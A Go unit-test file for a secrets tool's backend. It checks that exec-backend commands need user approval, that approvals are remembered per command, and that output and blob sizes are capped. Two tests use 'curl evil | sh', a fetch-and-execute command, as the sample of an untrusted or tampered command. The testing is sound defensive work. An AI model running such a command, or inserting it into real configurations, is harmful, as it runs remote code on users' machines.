package backend

import (
	"strings"
	"testing"
)

// tempHome points ~/.shenv (where the trust file lives) at a throwaway directory.
func tempHome(t *testing.T) {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("HOME", dir)        // Unix
	t.Setenv("USERPROFILE", dir) // Windows
}

func TestEnsureTrustedFileBackendNeedsNoApproval(t *testing.T) {
	tempHome(t)
	called := false
	err := EnsureTrusted(FileBackend{Path: "env.age"}, func(_, _ string) (bool, error) {
		called = true
		return false, nil
	})
	if err != nil {
		t.Fatalf("file backend should never need approval: %v", err)
	}
	if called {
		t.Fatal("confirm should not be called for a file backend")
	}
}

func TestEnsureTrustedDeclinedIsRejected(t *testing.T) {
	tempHome(t)
	inRepo(t)
	eb := ExecBackend{GetCmd: "curl evil | sh", PutCmd: "true"}
	if err := EnsureTrusted(eb, func(_, _ string) (bool, error) { return false, nil }); err == nil {
		t.Fatal("declined exec backend must be rejected")
	}
}

func TestEnsureTrustedApprovalIsRemembered(t *testing.T) {
	tempHome(t)
	inRepo(t)
	eb := ExecBackend{GetCmd: "fetch it", PutCmd: "store it"}

	calls := 0
	confirm := func(_, _ string) (bool, error) { calls++; return true, nil }

	if err := EnsureTrusted(eb, confirm); err != nil {
		t.Fatalf("first approval: %v", err)
	}
	if err := EnsureTrusted(eb, confirm); err != nil {
		t.Fatalf("second call: %v", err)
	}
	if calls != 1 {
		t.Fatalf("confirm called %d times; approval should be remembered after the first", calls)
	}
}

func TestEnsureTrustedIsPerCommand(t *testing.T) {
	tempHome(t)
	inRepo(t)
	approved := ExecBackend{GetCmd: "safe get", PutCmd: "safe put"}
	if err := EnsureTrusted(approved, func(_, _ string) (bool, error) { return true, nil }); err != nil {
		t.Fatal(err)
	}
	// A different command must NOT inherit the earlier approval.
	tampered := ExecBackend{GetCmd: "curl evil | sh", PutCmd: "safe put"}
	if err := EnsureTrusted(tampered, func(_, _ string) (bool, error) { return false, nil }); err == nil {
		t.Fatal("changed command must require fresh approval")
	}
}

func TestEnsureTrustedEnvOverride(t *testing.T) {
	tempHome(t)
	inRepo(t)
	t.Setenv("SHENV_ALLOW_EXEC", "1")
	eb := ExecBackend{GetCmd: "fetch it", PutCmd: "store it"}
	if err := EnsureTrusted(eb, func(_, _ string) (bool, error) {
		t.Fatal("confirm must not be called when SHENV_ALLOW_EXEC=1")
		return false, nil
	}); err != nil {
		t.Fatalf("env override should approve: %v", err)
	}
}

func TestCapWriterTripsOverLimit(t *testing.T) {
	w := &capWriter{limit: 10, what: "test output"}
	// Under the limit: buffered normally.
	if _, err := w.Write([]byte("12345")); err != nil {
		t.Fatalf("write within limit: %v", err)
	}
	// Crossing the limit: the writer records an error and stops buffering, but
	// keeps accepting bytes so the child process isn't blocked on a full pipe.
	if _, err := w.Write([]byte("6789012")); err != nil {
		t.Fatalf("capWriter must not return an error to the child: %v", err)
	}
	if w.err == nil || !strings.Contains(w.err.Error(), "limit") {
		t.Fatalf("expected a limit error to be recorded, got %v", w.err)
	}
}

func TestReadCappedRejectsOversized(t *testing.T) {
	oversized := strings.NewReader(strings.Repeat("a", maxBlobSize+1))
	if _, err := readCapped(oversized, "blob"); err == nil || !strings.Contains(err.Error(), "limit") {
		t.Fatalf("expected size-limit error, got %v", err)
	}
	if _, err := readCapped(strings.NewReader("small"), "blob"); err != nil {
		t.Fatalf("small input should pass: %v", err)
	}
}
